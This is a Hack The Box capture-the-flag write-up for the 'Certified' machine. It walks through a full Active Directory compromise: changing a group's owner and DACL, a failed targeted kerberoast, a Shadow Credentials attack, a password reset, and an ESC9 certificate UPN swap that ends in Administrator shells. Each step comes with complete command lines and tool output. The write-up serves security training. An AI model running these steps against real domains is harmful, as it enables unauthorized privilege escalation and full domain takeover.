---
title: "Hack The Box: Certified"
date: 2025-11-26
summary: "A Medium Windows-based machine where the target is compromised by taking ownership of an Active Directory group, modifying its DACL to grant membership, and executing a Shadow Credentials attack to compromise a service account. Privileges are then escalated to a certificate operator account, which is leveraged to exploit an ESC9 vulnerability in AD CS by modifying its UPN to request an administrative certificate and authenticate for full domain compromise."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Certified"
tags:
  - ace-genericall
  - ace-genericwrite
  - ace-writeowner
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - certipy-ad
  - esc9
  - evil-winrm
  - impacket-dacledit
  - impacket-owneredit
  - john
  - kerberoasting
  - net-rpc
  - netexec
  - nmap
  - shadow-credentials
  - targetedkerberoasting-py
---

### Provided Information

Attacker IP: 10.10.14.125

Target IP: 10.129.231.186

Credentials: `judith.mader:judith09`

### Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp 10.129.231.186
<SNIP>
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-26 16:42:18Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 / Server 2019 Build 17763
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap     syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>
```

The scan reveals typical Domain Controller services.

### SMB Enumeration

First, let’s create a hosts file for `/etc/hosts`:

```bash
$ netexec smb 10.129.231.186 -u judith.mader -p judith09 --generate-hosts-file hosts
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09

$ cat hosts | sudo tee -a /etc/hosts
10.129.231.186     DC01.certified.htb certified.htb DC01
```

With valid credentials, let’s enumerate available SMB shares:

```bash
$ netexec smb certified.htb -u judith.mader -p judith09 --shares
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.129.231.186  445    DC01             [*] Enumerated shares
SMB         10.129.231.186  445    DC01             Share           Permissions     Remark
SMB         10.129.231.186  445    DC01             -----           -----------     ------
SMB         10.129.231.186  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.186  445    DC01             C$                              Default share
SMB         10.129.231.186  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.186  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.231.186  445    DC01             SYSVOL          READ            Logon server share
```

Nothing too interesting. Those are typical domain shares.

### BloodHound Enumeration

To map the domain let’s use `bloodhound`.

First let’s collect data for it using `bloodhound-ce-python`.

But before everything, to avoid clock skew issues, let’s use `ntpdate` to sync the system’s clock with the target’s clock:

```bash
$ sudo ntpdate certified.htb
```

Now let's run `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d certified.htb -u judith.mader -p 'judith09' -ns 10.129.231.186 -c all --zip
<SNIP>
INFO: Compressing output into 20251126204455_bloodhound.zip
```

### Abusing Group Ownership and Exploiting Management_svc

After importing the data into `bloodhound`, setting Judith as owned, and checking shortest path from owned objects, the following paths are identified:

![Figure 1](/assets/images/writeups/hack-the-box-certified/hack-the-box-certified-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

As seen, Judith has WriteOwner permissions on the Management group, and the Management group has GenericWrite permission on the Management_svc user. Finally, Management_svc can WinRM, which is the path to initial foothold.

First, let’s change the owned of the Management group to be Judith using `impacket-owneredit`:

```bash
$ impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Now that we own the group, we can modify its DACL to give ourselves WriteMembers permission using `impacket-dacledit`:

```bash
$ impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20251126-211000.bak
[*] DACL modified successfully!
```

Now with the permission to write members, let’s add ourself to the Management group:

```bash
$ net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"
```

Nice.

### Failed Kerberoasting

Management group has GenericWrite permission over Management_svc user. The simple way to exploit this is by using [targeted kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast):

```bash
$ python3 targetedKerberoast.py -v -d certified.htb -u judith.mader -p 'judith09'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$6d399db5da<REDACTED>
```

Let’s save the hash in a file and attempt cracking it using `john`:

```bash
$ echo '$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$6d399db5da<REDACTED>' > management_svc.hash

$ john management_svc.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
Session completed.
```

The hash wasn’t cracked. Let’s switch to an alternative method.

### Succeeded Shadow Credentials Attack

Instead of targeted kerberoasting, let’s perform a Shadow Credentials attack (as suggested by `bloodhound`).

`certipy-ad` can automate the entire process:

```bash
$ certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.129.231.186
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
[*] NT hash for 'management_svc': a091c1<REDACTED>
```

Nice. Let’s verify the hash:

```bash
$ netexec smb certified.htb -u management_svc -H a091c1<REDACTED>
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\management_svc:a091c1<REDACTED>
```

Perfect.

### RCE as Management_svc

Let’s use `evil-winrm` to establish a shell where `user.txt` will be awaiting:

```bash
$ evil-winrm -i certified.htb -u management_svc -H a091c1<REDACTED

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\management_svc\Desktop> ls

    Directory: C:\Users\management_svc\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/26/2025   8:39 AM             34 user.txt

*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
f5b53b<REDACTED>
```

### Exploiting Ca_operator

As seen in figure 1, there is an exploitable user called Ca_operator. Its name suggests that Active Directory Certificate Services (AD CS) are being used in the domain, and they might have vulnerabilities.

Before testing this hypothesis, let’s abuse the GenericAll permission of Management_svc over Ca_operator to reset its password with `pth-net`:

```bash
$ pth-net rpc password "ca_operator" "caop1234" -U "certified.htb"/"management_svc"%"ffffffffffffffffffffffffffffffff":"a091c1<REDACTED>" -S "10.129.231.186"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

Let’s verify the new credentials for Ca_operator:

```bash
$ netexec smb certified.htb -u ca_operator -p caop1234
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\ca_operator:caop1234
```

Nice.

### ESC9

Now let’s enumerate vulnerable certificates using `certipy-ad`:

```bash
$ certipy-ad find -target certified.htb -u 'ca_operator' -p 'caop1234' -dc-ip 10.129.231.186 -dc-host DC01.certified.htb -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

<SNIP>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

There is a certificate template that is vulnerable to ESC9.

The [**author of certipy-ad explains ESC9**](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template) as the follows:

> ESC9 vulnerabilities arise when a certificate template is explicitly configured not to include the szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2) security extension in the certificates it issues. This extension, which contains the requester's SID, was introduced by Microsoft as part of the May 2022 "Certifried" updates (CVE-2022-26923 and KB5014754) to enable "strong certificate mapping". Strong mapping allows DCs to reliably and securely map a presented client certificate to a specific user or computer account in Active Directory using its SID.
> 

Basically, if we can change the UPN of Ca_operator, we can trick the CA into issuing a certificate that identifies as an Administrator.

1. Let’s modify the UPN of Ca_operator to Administrator:

```bash
$ certipy-ad account update -u management_svc -hashes :a091c1<REDACTED> -user ca_operator -upn Administrator -dc-ip 10.129.231.186
[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

1. Now let’s request a certificate as Ca_operator. The issued certificate will now contain `UPN=Administrator`:

```bash
$ certipy-ad req -u ca_operator -p caop1234 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186
[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

1. Before authenticating, we must change the UPN of Ca_operator back to the original value, otherwise the upcoming step will fail (perhaps because the KDC will get confused by two accounts having the same UPN):

```bash
$ certipy-ad account update -u management_svc -hashes :a091c1<REDACTED> -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

1. Finally, let’s authenticate using the certificate:

```bash
$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49<REDACTED>
```

Success!

### RCE as Administrator

With the admin’s hash in hand, let’s use `evil-winrm` to establish a shell and read `root.txt`:

```bash
$ evil-winrm -i certified.htb -u Administrator -H 0d5b49<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/26/2025   8:39 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3c8e0f<REDACTED>
```
